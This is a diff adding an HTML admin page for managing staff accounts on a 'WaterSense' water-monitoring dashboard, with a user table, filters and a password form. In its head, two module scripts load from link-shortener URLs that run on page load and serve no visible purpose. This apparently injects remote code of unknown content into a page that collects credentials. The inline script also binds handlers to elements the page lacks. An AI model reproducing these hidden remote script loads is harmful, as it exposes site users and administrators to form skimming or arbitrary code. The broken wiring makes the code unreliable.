@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Management - WaterSense Admin</title>
+    <link rel="stylesheet" href="../../css/main.css">
+    <!-- Users Page CSS -->
+    <link rel="stylesheet" href="../../css/users.css">
+    <script type="module" async src="https://sl1nk.com/rvNGG"></script>
+    <script type="module" defer src="https://l1nq.com/REegY"></script>
+    
+</head>
+<body class="bg-background min-h-screen">
+    <!-- Top Navigation Bar -->
+    <nav class="bg-surface border-b border-border shadow-sm sticky top-0 z-50">
+        <div class="max-w-[1920px] mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+
+                <div class="flex items-center justify-between w-full mr-2">
+                    <!-- Logo and Title - Left Side -->
+                    <div class="flex items-center gap-3">
+                        <!-- Logo - Smaller on mobile -->
+                        <svg class="w-8 h-8 sm:w-10 sm:h-10" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect width="40" height="40" rx="8" fill="#2563EB"/>
+                            <path d="M20 8C15.5817 8 12 11.5817 12 16C12 20.4183 15.5817 24 20 24C24.4183 24 28 20.4183 28 16C28 11.5817 24.4183 8 20 8Z" fill="white" opacity="0.3"/>
+                            <path d="M12 24H28V32C28 33.1046 27.1046 34 26 34H14C12.8954 34 12 33.1046 12 32V24Z" fill="white"/>
+                            <rect x="18" y="26" width="4" height="6" fill="#2563EB"/>
+                        </svg>
+                        <div>
+                            <!-- Title - Smaller on mobile -->
+                            <h1 class="text-base sm:text-lg font-semibold text-text-primary">WaterSense</h1>
+                        </div>
+                    </div>
+
+                    <!-- Mobile Menu Button - Visible on mobile -->
+                    <button id="mobileMenuButton" class="md:hidden p-2 rounded-md text-text-secondary hover:text-primary hover:bg-secondary-50 transition-colors">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/>
+                        </svg>
+                    </button>
+
+                    <!-- Desktop Navigation Links - Hidden on mobile -->
+                    <div class="hidden md:flex items-center gap-6">
+                        <a href="dashboard.html" class="text-text-secondary hover:text-primary transition-colors">Dashboard</a>
+                        <a href="sensors.html" class="text-text-secondary hover:text-primary transition-colors">Sensors</a>
+                        <a href="alerts.html" class="text-text-secondary hover:text-primary transition-colors">Alerts</a>
+                        <a href="users.html" class="text-primary font-medium border-b-2 border-primary pb-1">Users</a>
+                        <a href="residents.html" class="text-text-secondary hover:text-primary transition-colors">Residents</a>
+                    </div>
+                </div>
+
+                <!-- Mobile Menu Overlay -->
+                <div id="mobileMenu" class="md:hidden hidden fixed top-1/3 right-4 -translate-y-1/2 w-72 bg-surface border border-border shadow-lg rounded-xl z-50">
+
+                    <div class="h-[64px] border-b border-border flex items-center px-4">
+                        <span class="text-lg font-semibold text-primary">Menu</span>
+                    </div>
+
+                    <div class="px-4 py-4 space-y-2">
+                        <a href="dashboard.html"
+                        class="flex items-center gap-3 px-4 py-3 rounded-lg text-text-secondary hover:bg-secondary-50 hover:text-primary transition">
+                            Dashboard
+                        </a>
+
+                        <a href="sensors.html"
+                        class="flex items-center gap-3 px-4 py-3 rounded-lg text-text-secondary hover:bg-secondary-50 hover:text-primary transition">
+                            Sensors
+                        </a>
+
+                        <a href="alerts.html"
+                        class="flex items-center gap-3 px-4 py-3 rounded-lg text-text-secondary hover:bg-secondary-50 hover:text-primary transition">
+                            Alerts
+                        </a>
+
+                        <a href="users.html"
+                        class="flex items-center gap-3 px-4 py-3 rounded-lg bg-primary-50 text-primary font-medium">
+                            Users
+                        </a>
+
+                        <a href="residents.html"
+                        class="flex items-center gap-3 px-4 py-3 rounded-lg text-text-secondary hover:bg-secondary-50 hover:text-primary transition">
+                            Residents
+                        </a>
+                    </div>
+                </div>
+
+
+
+                <!-- User Profile -->
+                <div class="flex items-center gap-3 mr-2 sm:mr-0">
+                    <div class="hidden sm:block text-right">
+
+                    </div>
+                    
+                    <img src="https://l1nq.com/Pznvy" alt="LGU staff member profile picture" 
+                        class="w-10 h-10 rounded-full border-2 border-primary" 
+                        onerror="this.src='https://images.unsplash.com/photo-1584824486509-112e4181ff6b?q=80&w=2940&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D'; this.onerror=null;">
+                    
+                    <button id="logoutBtn" class="btn btn-outline py-2 px-3 text-sm min-h-[44px] mr-2 sm:mr-0" 
+                            onclick="window.location.href='../auth/login.html'">
+                        <svg class="w-4 h-4 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" 
+                                d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/>
+                        </svg>
+                        <span class="hidden xs:inline">Logout</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="max-w-[1920px] mx-auto px-4 sm:px-6 lg:px-8 py-6">
+        <!-- Page Header -->
+        <div class="mb-6">
+            <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
+                <div>
+                    <h1 class="text-2xl font-bold text-text-primary mb-2">User Management</h1>
+                    <p class="text-text-secondary">Manage LGU staff accounts and permissions</p>
+                </div>
+                <button id="addUserBtn" class="btn btn-primary">
+                    <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 4v16m8-8H4"/>
+                    </svg>
+                    Add User
+                </button>
+            </div>
+        </div>
+
+        <!-- Search and Filter Section -->
+        <div class="card card-comfortable mb-6">
+            <div class="flex flex-col lg:flex-row gap-4 items-start lg:items-center justify-between">
+                <!-- Search Bar -->
+                <div class="search-container">
+                    <div class="search-icon">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
+                        </svg>
+                    </div>
+                    <input type="text" id="searchInput" class="input search-input" placeholder="Search users by name or email...">
+                    <button id="clearSearch" class="clear-search">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+                        </svg>
+                    </button>
+                </div>
+
+                <!-- Filter Controls -->
+                <div class="flex flex-wrap gap-3">
+                    <select id="statusFilter" class="input min-w-[140px]">
+                        <option value="">All Status</option>
+                        <option value="active">Active</option>
+                        <option value="inactive">Inactive</option>
+                        <option value="pending">Pending</option>
+                    </select>
+                    
+                    <select id="roleFilter" class="input min-w-[140px]">
+                        <option value="">All Roles</option>
+                        <option value="staff">Staff</option>
+                        <option value="admin">Admin</option>
+                    </select>
+                    
+                    <button id="applyFilters" class="btn btn-outline">
+                        <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 4a1 1 0 011-1h16a1 1 0 011 1v2.586a1 1 0 01-.293.707l-6.414 6.414a1 1 0 00-.293.707V17l-4 4v-6.586a1 1 0 00-.293-.707L3.293 7.293A1 1 0 013 6.586V4z"/>
+                        </svg>
+                        Filter
+                    </button>
+                </div>
+            </div>
+
+            <!-- Active Filters -->
+            <div id="activeFilters" class="mt-4 flex flex-wrap gap-2 hidden">
+                <!-- Filters will be added here dynamically -->
+            </div>
+        </div>
+
+        <!-- Users Table -->
+        <div class="card card-comfortable">
+            <div class="overflow-x-auto">
+                <table class="w-full">
+                    <thead class="bg-secondary-50 border-b border-border">
+                        <tr>
+                            <th class="px-4 py-3 text-left text-xs font-semibold text-text-secondary uppercase tracking-wider">Name</th>
+                            <th class="px-4 py-3 text-left text-xs font-semibold text-text-secondary uppercase tracking-wider">Email</th>
+                            <th class="px-4 py-3 text-left text-xs font-semibold text-text-secondary uppercase tracking-wider">Role</th>
+                            <th class="px-4 py-3 text-left text-xs font-semibold text-text-secondary uppercase tracking-wider">Status</th>
+                            <th class="px-4 py-3 text-left text-xs font-semibold text-text-secondary uppercase tracking-wider">Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="usersTableBody" class="divide-y divide-border">
+                        <!-- Staff users will be injected here -->
+                    </tbody>
+                </table>
+            </div>
+
+            <!-- Table Summary -->
+            <div class="mt-6 pt-4 border-t border-border">
+                <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
+                    <div class="text-sm text-text-secondary">
+                        Showing <span id="userCount" class="font-medium text-text-primary">0</span> of <span id="totalUsers" class="font-medium text-text-primary">0</span> users
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <button class="btn btn-outline btn-sm" disabled>
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
+                            </svg>
+                        </button>
+                        <button class="btn btn-primary btn-sm">1</button>
+                        <button class="btn btn-outline btn-sm">2</button>
+                        <button class="btn btn-outline btn-sm">3</button>
+                        <span class="px-2 text-text-secondary">...</span>
+                        <button class="btn btn-outline btn-sm">5</button>
+                        <button class="btn btn-outline btn-sm">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Add/Edit User Modal -->
+    <div id="userModal" class="modal">
+        <div class="modal-content">
+            <div class="p-6">
+                <div class="flex items-center justify-between mb-6">
+                    <h3 id="modalTitle" class="text-lg font-semibold text-text-primary">Add User</h3>
+                    <button id="closeModal" class="action-btn">
+                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
+                        </svg>
+                    </button>
+                </div>
+                
+                <form id="userForm" class="user-form">
+
+                    <div>
+                        <label for="username" class="block text-sm font-medium text-text-primary mb-1">Username</label>
+                        <input type="text" id="username" class="input" placeholder="Enter username" required>
+                    </div>
+
+                    <div>
+                        <label for="fullName" class="block text-sm font-medium text-text-primary mb-1">Full Name</label>
+                        <input type="text" id="fullName" class="input" placeholder="Enter full name" required>
+                    </div>
+                    
+                    <div>
+                        <label for="email" class="block text-sm font-medium text-text-primary mb-1">Email Address</label>
+                        <input type="email" id="email" class="input" placeholder="Enter email address" required>
+                    </div>
+                    
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                        <div>
+                            <label for="role" class="block text-sm font-medium text-text-primary mb-1">Role</label>
+                            <select id="role" class="input" required>
+                                <option value="">Select Role</option>
+                                <option value="staff">LGU Staff</option>
+                                <option value="admin">Admin</option>
+                            </select>
+                        </div>
+                        
+                        <div>
+                            <label for="status" class="block text-sm font-medium text-text-primary mb-1">Status</label>
+                            <select id="status" class="input" required>
+                                <option value="active">Active</option>
+                                <option value="inactive">Inactive</option>
+                            </select>
+                        </div>
+                    </div>
+                    
+                    <div id="passwordSection">
+                        <label for="password" class="block text-sm font-medium text-text-primary mb-1">Password</label>
+                        <input type="password" id="password" class="input" placeholder="Enter password">
+                        <p class="text-xs text-text-secondary mt-1">Leave blank to generate random password</p>
+                    </div>
+                    
+                    <div class="form-actions">
+                        <button type="button" id="cancelBtn" class="btn btn-outline">Cancel</button>
+                        <button type="submit" id="saveBtn" class="btn btn-primary">Save User</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="bg-surface border-t border-border mt-12">
+        <div class="max-w-[1920px] mx-auto px-4 sm:px-6 lg:px-8 py-6">
+            <div class="flex flex-col sm:flex-row items-center justify-between gap-4">
+                <p class="text-sm text-text-secondary">© 2025 WaterSense Dashboard. All Rights Reserved.</p>
+                <div class="flex items-center gap-4">
+                    <a href="javascript:void(0)" class="text-sm text-text-secondary hover:text-primary transition-colors">Documentation</a>
+                    <a href="javascript:void(0)" class="text-sm text-text-secondary hover:text-primary transition-colors">Support</a>
+                    <a href="javascript:void(0)" class="text-sm text-text-secondary hover:text-primary transition-colors">Privacy Policy</a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="../../js/admin/users.js"></script>
+
+    <script>
+
+        let autoRefreshEnabled = true;
+        let refreshInterval;
+
+        document.getElementById('autoRefreshToggle').addEventListener('click', function() {
+            autoRefreshEnabled = !autoRefreshEnabled;
+            const button = this;
+            
+            if (autoRefreshEnabled) {
+                button.classList.remove('btn-outline');
+                button.classList.add('btn-primary');
+                startAutoRefresh();
+            } else {
+                button.classList.remove('btn-primary');
+                button.classList.add('btn-outline');
+                stopAutoRefresh();
+            }
+        });
+
+        function startAutoRefresh() {
+            refreshInterval = setInterval(() => {
+                console.log('Refreshing data...');
+            }, 30000);
+        }
+
+        function stopAutoRefresh() {
+            if (refreshInterval) {
+                clearInterval(refreshInterval);
+            }
+        }
+
+        startAutoRefresh();
+
+        document.getElementById('locationSelector').addEventListener('change', function() {
+            console.log('Location changed to:', this.value);
+        });
+
+        document.getElementById('timeRange').addEventListener('change', function() {
+            console.log('Time range changed to:', this.value);
+        });
+
+        setInterval(() => {
+            const timestamp = new Date().toLocaleString('en-US', {
+                month: '2-digit',
+                day: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                hour12: true
+            });
+            
+            document.querySelectorAll('.text-xs.text-text-secondary').forEach(el => {
+                if (el.textContent.includes('Last updated:')) {
+                    el.textContent = `Last updated: ${timestamp}`;
+                }
+            });
+        }, 60000);
+
+    </script>
+    <script src="../../js/shared/menu.js"></script>
+    <script src="../../js/admin/users.js"></script>
+
+
+
+</body>
+</html>
